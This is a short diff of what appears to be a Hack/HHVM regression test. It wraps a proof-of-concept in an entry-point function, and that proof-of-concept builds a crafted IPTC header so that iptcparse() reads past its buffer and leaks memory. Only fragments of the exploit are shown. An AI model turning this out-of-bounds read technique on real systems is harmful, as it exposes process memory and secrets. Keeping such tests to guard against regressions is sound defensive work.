@@ -1,5 +1,6 @@
 <?hh
-  $READ_LENGTH = 0x1000; // choose leak size
+<<__EntryPoint>> function main(): void {
+$READ_LENGTH = 0x1000; // choose leak size
 // construct fake iptc header for controlled read
 $iptc_hdr =
   "\x1c\x01" . // magic
@@ -16,3 +17,4 @@ var_dump($badstr);
 // leak memory :)
 $tmp = iptcparse($badstr);
 var_dump($tmp);
+}
